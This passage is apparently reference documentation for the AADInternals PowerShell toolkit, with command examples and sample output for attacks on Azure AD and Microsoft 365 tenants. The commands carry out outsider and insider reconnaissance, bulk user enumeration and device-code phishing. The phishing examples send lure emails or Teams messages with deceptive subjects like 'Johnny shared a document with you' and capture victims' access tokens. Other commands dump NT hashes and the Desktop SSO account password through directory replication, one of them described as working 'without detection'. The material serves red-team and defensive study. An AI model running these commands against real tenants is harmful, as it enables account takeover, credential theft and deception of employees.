<p>Also checks whether Desktop SSO (aka Seamless SSO) is enabled for the tenant.</p>

<table>
<thead>
<tr>
<th>Value</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>DNS</td>
<td>Does the DNS record exists?</td>
</tr>

<tr>
<td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online" target="_blank">MX</a></td>
<td>Does the MX point to Office 365?</td>
</tr>

<tr>
<td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online" target="_blank">SPF</a></td>
<td>Does the SPF contain Exchange Online?</td>
</tr>

<tr>
<td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/deploy-identity-solution-identity-model?#authentication-for-hybrid-identity" target="_blank">Type</a></td>
<td>Federated or Managed</td>
</tr>

<tr>
<td><a href="https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dmarc-configure" target="_blank">DMARC</a></td>
<td>Is the DMARC record configured?</td>
</tr>

<tr>
<td><a href="https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dkim-configure" target="_blank">DKIM </a></td>
<td>Is the DKIM record configured?</td>
</tr>

<tr>
<td><a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/introducing-mta-sts-for-exchange-online/ba-p/3106386" target="_blank">MTA-STS</a></td>
<td>Is the MTA-STS recored configured?</td>
</tr>

<tr>
<td>STS</td>
<td>The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server</td>
</tr>

<tr>
<td><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/operations/create-a-relying-party-trust" target="_blank">RPS</a></td>
<td>Relaying parties of STS (AD FS). Requires -GetRelayingParties switch.</td>
</tr>
</tbody>
</table>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Invoke tenant recon as an outsider</span>
<span class="nb">Invoke-AADIntReconAsOutsider</span> <span class="n">-Domain</span> <span class="s2">"company.com"</span> <span class="p">|</span> <span class="nb">Format-Table</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Tenant brand:       Company Ltd
Tenant name:        company
Tenant region:      NA
Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
MDI instance:       company.atp.azure.com
DesktopSSO enabled: False

Name                           DNS   MX    SPF  DMARC  DKIM MTA-STS Type      STS
----                           ---   --    ---  -----  ---- ------- ----      ---
company.com                   True  True  True   True  True    True Federated sts.company.com
company.mail.onmicrosoft.com  True  True  True   True  True   False Managed
company.onmicrosoft.com       True  True  True  False  True   False Managed
int.company.com              False False False  False  True   False Managed
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Invoke tenant recon as an outsider using a known user name to show CBA status</span>
<span class="nb">Invoke-AADIntReconAsOutsider</span> <span class="n">-UserName</span> <span class="s2">"user@company.com"</span> <span class="p">|</span> <span class="nb">Format-Table</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Tenant brand:       Company Ltd
Tenant name:        company
Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
Tenant region:      NA
DesktopSSO enabled: False
MDI instance:       company.atp.azure.com
CBA enabled:        True

Name                           DNS   MX    SPF  DMARC  DKIM MTA-STS Type      STS
----                           ---   --    ---  -----  ---- ------- ----      ---
company.com                   True  True  True   True  True    True Federated sts.company.com
company.mail.onmicrosoft.com  True  True  True   True  True   False Managed
company.onmicrosoft.com       True  True  True  False  True   False Managed
int.company.com              False False False  False  True   False Managed
</code></pre>

<p><strong>Example 3:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Invoke tenant recon and get relaying trust parties</span>
<span class="nb">Invoke-AADIntReconAsOutsider</span> <span class="n">-Domain</span> <span class="s2">"company.com"</span> <span class="n">-GetRelayingParties</span> <span class="p">|</span> <span class="nb">Format-Table</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Tenant brand:       Company Ltd
Tenant name:        company
Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
Tenant region:      NA
DesktopSSO enabled: False

Name                           DNS   MX    SPF  DMARC  DKIM MTA-STS Type      STS
----                           ---   --    ---  -----  ---- ------- ----      ---
company.com                   True  True  True   True  True    True Federated sts.company.com
company.mail.onmicrosoft.com  True  True  True   True  True   False Managed
company.onmicrosoft.com       True  True  True  False  True   False Managed
int.company.com              False False False  False  True   False Managed
</code></pre>

<h3 id="invoke-aadintuserenumerationasoutsider">Invoke-AADIntUserEnumerationAsOutsider</h3>

<p>Since version 0.4.0 <br></p>

<p>Checks whether the given user exists in Azure AD or not. Works also with external users! Supports three enumeration methods:</p>

<table>
<thead>
<tr>
<th>Method</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>Normal</td>
<td>Uses GetCredentialType endpoint to query user information</td>
</tr>

<tr>
<td>Login</td>
<td>Tries to log in to Azure AD using oauth2 endpoint</td>
</tr>

<tr>
<td>Autologon</td>
<td>Tries to log in to Azure AD using autologon endpoint</td>
</tr>

<tr>
<td>RST2</td>
<td>Tries to log in to Azure AD using RST2 endpoint</td>
</tr>
</tbody>
</table>

<p>Returns $True or $False if existence can be verified and empty if not.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Invoke user enumeration as an outsider</span>
<span class="nb">Invoke-AADIntUserEnumerationAsOutsider</span> <span class="n">-UserName</span> <span class="s2">"user@company.com"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserName         Exists
--------         ------
user@company.com True
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Invoke user enumeration as an outsider using a text file</span>
<span class="nb">Get-Content</span> <span class="p">.\</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="nb">Invoke-AADIntUserEnumerationAsOutsider</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserName                                               Exists
--------                                               ------
user@company.com                                       True
user2@company.com                                      False
user@company.net                                      
external.user_gmail.com#EXT#@company.onmicrosoft.com   True
external.user_outlook.com#EXT#@company.onmicrosoft.com False
</code></pre>

<p><strong>Example 3:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Invoke user enumeration as an outsider using a text file with Login method</span>
<span class="nb">Get-Content</span> <span class="p">.\</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="nb">Invoke-AADIntUserEnumerationAsOutsider</span> <span class="n">-Method</span> <span class="n">Login</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserName                                               Exists
--------                                               ------
user@company.com                                       True
user2@company.com                                      False
user@company.net                                       True
external.user_gmail.com#EXT#@company.onmicrosoft.com   True
external.user_outlook.com#EXT#@company.onmicrosoft.com False
</code></pre>

<p><strong>Example 4:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Invoke user enumeration as an outsider with Autologon method</span>
<span class="nb">Invoke-AADIntUserEnumerationAsOutsider</span> <span class="n">-UserName</span> <span class="s2">"user@company.com"</span><span class="p">,</span><span class="s2">"user2@company.com"</span> <span class="n">-Method</span> <span class="n">Autologon</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserName                                               Exists
--------                                               ------
user@company.com                                       True
user2@company.com                                      False
</code></pre>

<h3 id="invoke-aadintreconasguest-ac">Invoke-AADIntReconAsGuest (AC)</h3>

<p>Since version 0.4.0 <br></p>

<p>Starts tenant recon of Azure AD tenant. Prompts for tenant. Retrieves information from Azure AD tenant, such as, the number of Azure AD objects and quota, and the number of domains (both verified and unverified).</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># Invoke tenant recon as guest</span>
<span class="nv">$results</span> <span class="p">=</span> <span class="nb">Invoke-AADIntReconAsGuest</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Tenant brand:                Company Ltd
Tenant name:                 company.onmicrosoft.com
Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Azure AD objects:            520/500000
Domains:                     6 (4 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
</code></pre>

<p></p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show users allowed actions</span>
<span class="nv">$results</span><span class="p">.</span><span class="n">allowedActions</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>application      : {read}
domain           : {read}
group            : {read}
serviceprincipal : {read}
tenantdetail     : {read}
user             : {read, update}
serviceaction    : {consent}
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># List Azure tenants the user has access to</span>
<span class="nb">Get-AADIntAzureTenants</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Id                                   Country Name                      Domains
--                                   ------- ----                      -------
221769d7-0747-467c-a5c1-e387a232c58c FI      Firma Oy                  {firma.mail.onmicrosoft.com, firma.onmicrosoft.com, firma.fi}
6e3846ee-e8ca-4609-a3ab-f405cfbd02cd US      Company Ltd               {company.onmicrosoft.com, company.mail.onmicrosoft.com,company.com}
</code></pre>

<p></p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get a new access token for the specific tenant in case of MFA is required</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span> <span class="n">-Tenant</span> <span class="n">6e3846ee-e8ca</span><span class="p">-</span><span class="n">4609-a3ab-f405cfbd02cd</span>

<span class="c"># Invoke tenant recon as guest</span>
<span class="nv">$results</span> <span class="p">=</span> <span class="nb">Invoke-AADIntReconAsGuest</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Tenant brand:                Company Ltd
Tenant name:                 company.onmicrosoft.com
Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Azure AD objects:            520/500000
Domains:                     6 (4 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
</code></pre>

<p></p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show users allowed actions</span>
<span class="nv">$results</span><span class="p">.</span><span class="n">allowedActions</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>application      : {read}
domain           : {read}
group            : {read}
serviceprincipal : {read}
tenantdetail     : {read}
user             : {read, update}
serviceaction    : {consent}
</code></pre>

<h3 id="invoke-aadintuserenumerationasguest-ac">Invoke-AADIntUserEnumerationAsGuest (AC)</h3>

<p>Since version 0.4.0 <br></p>

<p>Crawls the target organisation for user names, groups, and roles. The starting point is the signed-in user, a given username, or a group id.</p>

<p>The crawl can be controlled with switches. Group members are limited to 1000 entries per group.</p>

<table>
<thead>
<tr>
<th>Switch</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>Groups</td>
<td>Include user’s groups</td>
</tr>

<tr>
<td>GroupMembers</td>
<td>Include members of user’s groups</td>
</tr>

<tr>
<td>Roles</td>
<td>Include roles of user and group members. Can be very time consuming!</td>
</tr>

<tr>
<td>Manager</td>
<td>Include user’s manager</td>
</tr>

<tr>
<td>Subordinates</td>
<td>Include user’s subordinates (direct reports)</td>
</tr>
</tbody>
</table>

<p>Parameters:</p>

<table>
<thead>
<tr>
<th>Parameter</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>UserName</td>
<td>User principal name (UPN) of the user to search. If not given, the user name from the access token is used and treated as external (email_domain#EXT#@company.onmicrosoft.com)</td>
</tr>

<tr>
<td>GroupId</td>
<td>Id of the group. If this is given, only the members of the group are included.</td>
</tr>
</tbody>
</table>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Invoke user enumeration as a guest</span>
<span class="nv">$results</span> <span class="p">=</span> <span class="nb">Invoke-AADIntUserEnumerationAsGuest</span> <span class="n">-UserName</span> <span class="s2">"user@company.com"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Tenant brand: Company Ltd
Tenant name:  company.onmicrosoft.com
Tenant id:    6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Logged in as: live.com#user@outlook.com
Users:        5
Groups:       2
Roles:        0
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Invoke user enumeration as an outsider using a text file</span>
<span class="nb">Get-Content</span> <span class="p">.\</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="nb">Invoke-AADIntUserEnumerationAsOutsider</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserName                                               Exists
--------                                               ------
user@company.com                                       True
user2@company.com                                      False
external.user_gmail.com#EXT#@company.onmicrosoft.com   True
external.user_outlook.com#EXT#@company.onmicrosoft.com False
</code></pre>

<h3 id="invoke-aadintreconasinsider-ac">Invoke-AADIntReconAsInsider (AC)</h3>

<p>Since version 0.4.0 <br></p>

<p>Starts tenant recon of Azure AD tenant.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># Invoke tenant recon as guest</span>
<span class="nv">$results</span> <span class="p">=</span> <span class="nb">Invoke-AADIntReconAsInsider</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Tenant brand:                Company Ltd
Tenant name:                 company.onmicrosoft.com
Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Tenant SKU:                  E3
Azure AD objects:            520/500000
Domains:                     6 (4 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
Directory sync enabled?      true
Global admins                3
</code></pre>

<p></p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># List all admin roles that have members</span>
<span class="nv">$results</span><span class="p">.</span><span class="n">roleInformation</span> <span class="p">|</span> <span class="nb">Where </span><span class="n">Members</span> <span class="o">-ne</span> <span class="nv">$null</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span><span class="p">,</span><span class="n">Members</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Name                               Members                                                                                       
----                               -------                                                                                       
Company Administrator              {@{DisplayName=MOD Administrator; UserPrincipalName=admin@company.onmicrosoft.com}, @{D...
User Account Administrator         @{DisplayName=User Admin; UserPrincipalName=useradmin@company.com}                   
Directory Readers                  {@{DisplayName=Microsoft.Azure.SyncFabric; UserPrincipalName=}, @{DisplayName=MicrosoftAzur...
Directory Synchronization Accounts {@{DisplayName=On-Premises Directory Synchronization Service Account; UserPrincipalName=Syn...
</code></pre>

<h3 id="invoke-aadintuserenumerationasinsider-ac">Invoke-AADIntUserEnumerationAsInsider (AC)</h3>

<p>Since version 0.4.0 <br></p>

<p>Dumps user names and groups of the tenant.</p>

<p>By default, the first 1000 users and groups are returned.</p>

<table>
<thead>
<tr>
<th>Switch</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>Groups</td>
<td>Include groups</td>
</tr>

<tr>
<td>GroupMembers</td>
<td>Include members of the groups (not recommended)</td>
</tr>
</tbody>
</table>

<p>Parameters:</p>

<table>
<thead>
<tr>
<th>Parameter</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>GroupId</td>
<td>Id of the group. Id of the group. If this is given, only one group and members are included.</td>
</tr>
</tbody>
</table>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Invoke user enumeration as a insider</span>
<span class="nv">$results</span> <span class="p">=</span> <span class="nb">Invoke-AADIntUserEnumerationAsInsider</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Users:        5542
Groups:        212
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># List the first user's information</span>
<span class="nv">$results</span><span class="p">.</span><span class="n">Users</span><span class="p">[</span><span class="n">0</span><span class="p">]</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>id                              : 7ab0eb51-b7cb-4ff0-84ec-893a413d7b4a
displayName                     : User Demo
userPrincipalName               : User@company.com
onPremisesImmutableId           : UQ989+t6fEq9/0ogYtt1pA==
onPremisesLastSyncDateTime      : 2020-07-14T08:18:47Z
onPremisesSamAccountName        : UserD
onPremisesSecurityIdentifier    : S-1-5-21-854168551-3279074086-2022502410-1104
refreshTokensValidFromDateTime  : 2019-07-14T08:21:35Z
signInSessionsValidFromDateTime : 2019-07-14T08:21:35Z
proxyAddresses                  : {smtp:User@company.onmicrosoft.com, SMTP:User@company.com}
businessPhones                  : {+1234567890}
identities                      : {@{signInType=userPrincipalName; issuer=company.onmicrosoft.com; issuerAssignedId=User@company.com}} 
</code></pre>

<h3 id="invoke-aadintphishing">Invoke-AADIntPhishing</h3>

<p>Since version 0.4.4 <br></p>

<p>Sends phishing mail to given recipients and receives user’s access token using <a href="/post/phishing" target="_blank">device code authentication</a> flow.</p>

<p>The sent message is an html message. Uses string formatting to insert url and user code:</p>

<table>
<thead>
<tr>
<th>Placeholder</th>
<th>Value</th>
</tr>
</thead>

<tbody>
<tr>
<td>{0}</td>
<td>user code</td>
</tr>

<tr>
<td>{1}</td>
<td>signing url</td>
</tr>
</tbody>
</table>

<p>Default message:</p>

<pre><code>'&lt;div&gt;Hi!&lt;br/&gt;This is a message sent to you by someone who is using &lt;a href="https://o365blog.com/aadinternals"&gt;AADInternals&lt;/a&gt; phishing function. &lt;br/&gt;&lt;br/&gt;Here is a &lt;a href="{1}"&gt;link&lt;/a&gt; you &lt;b&gt;should not click&lt;/b&gt;.&lt;br/&gt;&lt;br/&gt;If you still decide to do so, provide the following code when requested: &lt;b&gt;{0}&lt;/b&gt;.&lt;/div&gt;'
</code></pre>

<p>Email:<br>
<img src="/images/posts/phishing_11.png" alt="Phishing email"></p>

<p>Teams:<br>
<img src="/images/posts/phishing_12.png" alt="Phishing message"></p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Send a phishing email to a recipient using the default message</span>
<span class="nv">$tokens</span> <span class="p">=</span> <span class="nb">Invoke-AADPhishing</span> <span class="n">-Recipients</span> <span class="s2">"wvictim@company.com"</span> <span class="n">-Subject</span> <span class="s2">"Johnny shared a document with you"</span> <span class="n">-Sender</span> <span class="s2">"Johnny Carson &lt;jc@somewhere.com&gt;"</span> <span class="n">-SMTPServer</span> <span class="n">smtp</span><span class="p">.</span><span class="n">myserver</span><span class="p">.</span><span class="n">local</span>
</code></pre></div>
<p></p>

<p><strong>Output1:</strong></p>

<pre><code>Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
</code></pre>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for teams</span>
<span class="nb">Get-AADIntAccessTokenForTeams</span> <span class="n">-SaveToCache</span>

<span class="c"># Send a teams message to a recipient using the default message</span>
<span class="nv">$tokens</span> <span class="p">=</span> <span class="nb">Invoke-AADPhishing</span> <span class="n">-Recipients</span> <span class="s2">"wvictim@company.com"</span> <span class="n">-Teams</span>
</code></pre></div>
<p></p>

<p><strong>Output2:</strong></p>

<pre><code>Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
</code></pre>

<p><strong>Example3:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Send a phishing email to recipients using a customised message and save the tokens to cache</span>
<span class="nb">Invoke-AADPhishing</span> <span class="n">-Recipients</span> <span class="s2">"wvictim@company.com"</span><span class="p">,</span><span class="s2">"wvictim2@company.com"</span> <span class="n">-Subject</span> <span class="s2">"Johnny shared a document with you"</span> <span class="n">-Sender</span> <span class="s2">"Johnny Carson &lt;jc@somewhere.com&gt;"</span> <span class="n">-SMTPServer</span> <span class="n">smtp</span><span class="p">.</span><span class="n">myserver</span><span class="p">.</span><span class="n">local</span> <span class="n">-Message</span> <span class="s1">'&lt;html&gt;Hi!&lt;br&gt;Here is the link to the &lt;a href="{1}"&gt;document&lt;/a&gt;. Use the following code to access: &lt;b&gt;{0}&lt;/b&gt;.&lt;/html&gt;'</span> <span class="n">-SaveToCache</span> 
</code></pre></div>
<p></p>

<pre><code>Code: CKDZ2BURF
Mail sent to: wvictim@company.com
Mail sent to: wvictim2@company.com
...
Received access token for william.victim@company.com
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Invoke the recon as an insider</span>
<span class="nv">$results</span> <span class="p">=</span> <span class="nb">Invoke-AADIntReconAsInsider</span>
</code></pre></div>


<p><strong>Output3:</strong></p>

<pre><code>Tenant brand:                company.com
Tenant name:                 company.onmicrosoft.com
Tenant id:                   d4e225d6-8877-4bc6-b68c-52c44011ba81
Azure AD objects:            147960/300000
Domains:                     5 (5 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
Directory sync enabled?      true
Global admins                10
</code></pre>

<h2 id="drs-functions">DRS functions</h2>

<h3 id="get-aadintadusernthash">Get-AADIntAdUserNTHash (*)</h3>

<p>Since version 0.4.7 <br></p>

<p>Gets NTHash for the given object ID using Directory Replication Service (DRS).</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the credentials with replication rights</span>
<span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Get-Credential</span>

<span class="c"># Get the photo</span>
<span class="nv">$NTHash</span> <span class="p">=</span> <span class="nb">Get-AADIntAdUserNTHash</span> <span class="n">-ObjectGuid</span> <span class="n">36f71b0f</span><span class="p">-</span><span class="n">9963</span><span class="p">-</span><span class="n">48e9</span><span class="p">-</span><span class="n">8efa</span><span class="p">-</span><span class="n">9441f54ed1a4</span> <span class="n">-Credentials</span> <span class="nv">$cred</span> <span class="n">-Server</span> <span class="s2">"dc.company.com"</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintaduserthumbnailphoto">Get-AADIntADUserThumbnailPhoto (*)</h3>

<p>Since version 0.4.7 <br></p>

<p>Gets thumbnailPhoto for the given object ID using Directory Replication Service (DRS).
Can be used to access ADFS KDS container without detection.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the credentials with replication rights</span>
<span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Get-Credential</span>

<span class="c"># Get the photo</span>
<span class="nv">$photo</span> <span class="p">=</span> <span class="nb">Get-AADIntADUserThumbnailPhoto</span> <span class="n">-ObjectGuid</span> <span class="n">36f71b0f</span><span class="p">-</span><span class="n">9963</span><span class="p">-</span><span class="n">48e9</span><span class="p">-</span><span class="n">8efa</span><span class="p">-</span><span class="n">9441f54ed1a4</span> <span class="n">-Credentials</span> <span class="nv">$cred</span> <span class="n">-Server</span> <span class="s2">"dc.company.com"</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintdesktopssoaccountpassword">Get-AADIntDesktopSSOAccountPassword (*)</h3>

<p>Since version 0.4.7 <br></p>

<p>Gets NTHash of Desktop SSO account using Directory Replication Service (DRS).</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the credentials with replication rights</span>
<span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Get-Credential</span>

<span class="c"># Get the photo</span>
<span class="nv">$NTHash</span> <span class="p">=</span> <span class="nb">Get-AADIntDesktopSSOAccountPassword</span> <span class="n">-Credentials</span> <span class="nv">$cred</span> <span class="n">-Server</span> <span class="s2">"dc.company.com"</span>
</code></pre></div>
<p></p>

<h2 id="ms-partner-functions">MS Partner functions</h2>

<h3 id="new-aadintmspartnerdelegatedadminrequest">New-AADIntMSPartnerDelegatedAdminRequest (*)</h3>

<p>Since version 0.6.5 <br></p>

<p>Creates a new delegated admin request for the given MS partner organisation.</p>

<p>The returned url can be used by customers to accept the partner request.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create the delegated admin request for the given partner domain</span>
<span class="nb">New-AADIntMSPartnerDelegatedAdminRequest</span> <span class="n">-Domain</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>https://admin.microsoft.com/Adminportal/Home?invType=Administration&amp;partnerId=c7e52a77-e461-4f2e-a652-573305414be9#/BillingAccounts/partner-invitation
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create the delegated admin request for the given partner tenant</span>
<span class="nb">New-AADIntMSPartnerDelegatedAdminRequest</span> <span class="n">-TenantId</span> <span class="n">c7e52a77-e461</span><span class="p">-</span><span class="n">4f2e-a652</span><span class="p">-</span><span class="n">573305414be9</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>https://admin.microsoft.com/Adminportal/Home?invType=Administration&amp;partnerId=c7e52a77-e461-4f2e-a652-573305414be9#/BillingAccounts/partner-invitation
</code></pre>

<h3 id="approve-aadintmspartnerdelegatedadminrequest-ad">Approve-AADIntMSPartnerDelegatedAdminRequest (AD)</h3>

<p>Since version 0.6.5 <br></p>

<p>Assigns Delegated Admin Permissions (DAP) for the given partner organisation. Requires Global Admin permissions.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAdmin</span> <span class="n">-SaveToCache</span>

<span class="c"># Assign DAP for the given partner</span>
<span class="nb">Approve-AADIntMSPartnerDelegatedAdminRequest</span> <span class="n">-Domain</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>responseCode message
------------ -------
success 
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAdmin</span> <span class="n">-SaveToCache</span>

<span class="c"># Assign DAP for the given partner</span>
<span class="nb">Approve-AADIntMSPartnerDelegatedAdminRequest</span> <span class="n">-TenantId</span> <span class="n">c7e52a77-e461</span><span class="p">-</span><span class="n">4f2e-a652</span><span class="p">-</span><span class="n">573305414be9</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>responseCode message
------------ -------
success 
</code></pre>

<h3 id="remove-aadintmspartnerdelegatedadminroles-ad">Remove-AADIntMSPartnerDelegatedAdminRoles (AD)</h3>

<p>Since version 0.6.5 <br></p>

<p>Removes Delegated Admin Permissions (DAP) from the given partner organisation. Requires Global Admin permissions.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAdmin</span> <span class="n">-SaveToCache</span>

<span class="c"># Remove DAP from the given partner</span>
<span class="nb">Remove-AADIntMSPartnerDelegatedAdminRoles</span> <span class="n">-Domain</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>responseCode message
------------ -------
success 
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAdmin</span> <span class="n">-SaveToCache</span>

<span class="c"># Remove DAP from the given partner</span>
<span class="nb">Remove-AADIntMSPartnerDelegatedAdminRoles</span> <span class="n">-TenantId</span> <span class="n">c7e52a77-e461</span><span class="p">-</span><span class="n">4f2e-a652</span><span class="p">-</span><span class="n">573305414be9</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>responseCode message
------------ -------
success 
</code></pre>

<h3 id="get-aadintmspartners-ad">Get-AADIntMSPartners (AD)</h3>

<p>Since version 0.6.5 <br></p>

<p>Shows organisation’s partners using Admin API. Requires permissions to Microsoft 365 admin center.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAdmin</span> <span class="n">-SaveToCache</span>

<span class="c"># List the partners</span>
<span class="nb">Get-AADIntMSPartners</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Identity         : b1f6d5cc-f1d3-41d9-b88c-1d177aaf171b
DisplayName      : Partner Ltd
Email            : pmanager@company.com
Website          : http://www.company.com
